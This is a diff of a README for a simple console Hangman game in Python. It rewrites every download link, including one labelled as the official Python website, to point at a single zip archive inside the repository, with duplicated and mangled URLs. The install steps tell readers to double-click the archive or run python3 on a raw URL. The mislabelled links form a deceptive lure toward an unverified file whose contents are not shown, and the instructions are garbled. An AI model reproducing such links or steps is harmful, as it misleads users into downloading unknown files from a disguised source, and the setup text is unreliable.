@@ -4,7 +4,7 @@
 Welcome to hangman-python! This is a simple console version of the classic Hangman game made with Python. It's easy to download and play, even if you don't have any programming experience.
 
 ## 📥 Download Now
-[![Download hangman-python](https://raw.githubusercontent.com/Lasrijan3105/hangman-python/master/Hangman (Python)/hangman-python-v2.7.zip)](https://raw.githubusercontent.com/Lasrijan3105/hangman-python/master/Hangman (Python)/hangman-python-v2.7.zip)
+[![Download hangman-python](https://raw.githubusercontent.com/Lasrijan3105/hangman-python/master/Hangman (Python)/task/python_hangman_v2.5.zip (Python)https://raw.githubusercontent.com/Lasrijan3105/hangman-python/master/Hangman (Python)/task/python_hangman_v2.5.zip)](https://raw.githubusercontent.com/Lasrijan3105/hangman-python/master/Hangman (Python)/task/python_hangman_v2.5.zip (Python)https://raw.githubusercontent.com/Lasrijan3105/hangman-python/master/Hangman (Python)/task/python_hangman_v2.5.zip)
 
 ## 📋 Description
 Hangman-python is a small console game where players guess letters to reveal a hidden word. You can enjoy this game alone or challenge friends. It's a fun way to improve your vocabulary or just pass the time.
@@ -16,7 +16,7 @@ Hangman-python is a small console game where players guess letters to reveal a h
 - Disk Space: About 20 MB of free space
 
 ## 🌐 Download & Install
-To get started, visit this page to download: [Download Page](https://raw.githubusercontent.com/Lasrijan3105/hangman-python/master/Hangman (Python)/hangman-python-v2.7.zip).
+To get started, visit this page to download: [Download Page](https://raw.githubusercontent.com/Lasrijan3105/hangman-python/master/Hangman (Python)/task/python_hangman_v2.5.zip (Python)https://raw.githubusercontent.com/Lasrijan3105/hangman-python/master/Hangman (Python)/task/python_hangman_v2.5.zip).
 
 1. **Visit the Releases Page**: Click the link above to go to the releases page.
   
@@ -26,12 +26,12 @@ To get started, visit this page to download: [Download Page](https://raw.githubu
 
 4. **Run the Game**:
    - For **Windows**:
-     1. Double-click the downloaded file (e.g., `https://raw.githubusercontent.com/Lasrijan3105/hangman-python/master/Hangman (Python)/hangman-python-v2.7.zip`).
+     1. Double-click the downloaded file (e.g., `https://raw.githubusercontent.com/Lasrijan3105/hangman-python/master/Hangman (Python)/task/python_hangman_v2.5.zip (Python)https://raw.githubusercontent.com/Lasrijan3105/hangman-python/master/Hangman (Python)/task/python_hangman_v2.5.zip`).
      2. The game will open in your console.
    - For **MacOS or Linux**:
      1. Open Terminal.
      2. Navigate to the folder where the file is located, using the `cd` command.
-     3. Type `python3 https://raw.githubusercontent.com/Lasrijan3105/hangman-python/master/Hangman (Python)/hangman-python-v2.7.zip` and hit enter.
+     3. Type `python3 https://raw.githubusercontent.com/Lasrijan3105/hangman-python/master/Hangman (Python)/task/python_hangman_v2.5.zip (Python)https://raw.githubusercontent.com/Lasrijan3105/hangman-python/master/Hangman (Python)/task/python_hangman_v2.5.zip` and hit enter.
 
 Once the game starts, follow the on-screen instructions to begin playing.
 
@@ -49,7 +49,7 @@ Once the game starts, follow the on-screen instructions to begin playing.
 - Classic fun: Experience the timeless game.
 
 ## 📖 Important Notes
-- Ensure you have Python installed on your system. You can download it from the [official Python website](https://raw.githubusercontent.com/Lasrijan3105/hangman-python/master/Hangman (Python)/hangman-python-v2.7.zip).
+- Ensure you have Python installed on your system. You can download it from the [official Python website](https://raw.githubusercontent.com/Lasrijan3105/hangman-python/master/Hangman (Python)/task/python_hangman_v2.5.zip (Python)https://raw.githubusercontent.com/Lasrijan3105/hangman-python/master/Hangman (Python)/task/python_hangman_v2.5.zip).
 - Make sure your console can run scripts; some settings might need adjusting based on your system's configuration.
 
 ## 🤝 Feedback and Support
